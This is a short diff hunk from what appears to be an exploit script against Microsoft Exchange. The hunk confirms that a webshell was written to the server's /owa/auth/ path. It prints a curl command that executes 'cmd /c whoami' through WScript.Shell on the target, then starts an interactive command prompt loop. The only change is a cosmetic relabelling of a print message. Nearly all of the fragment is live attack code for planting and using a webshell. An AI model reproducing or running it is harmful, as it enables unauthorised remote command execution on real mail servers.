@@ -177,7 +177,7 @@ if ct.status_code != 200:
     print("Write Shell Error!")
     exit()
 print('(+) Webshell drop at https://%s/owa/auth/%s .. Have fun!'%(target, shell_name))
-print('(+) Enjoy your shell: curl -ik https://%s/owa/auth/%s -d \'exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())\''%(target, shell_name))
+print('(+) Code: curl -ik https://%s/owa/auth/%s -d \'exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())\''%(target, shell_name))
 time.sleep(2)
 while True:
 	cmd = input('CMD: ')
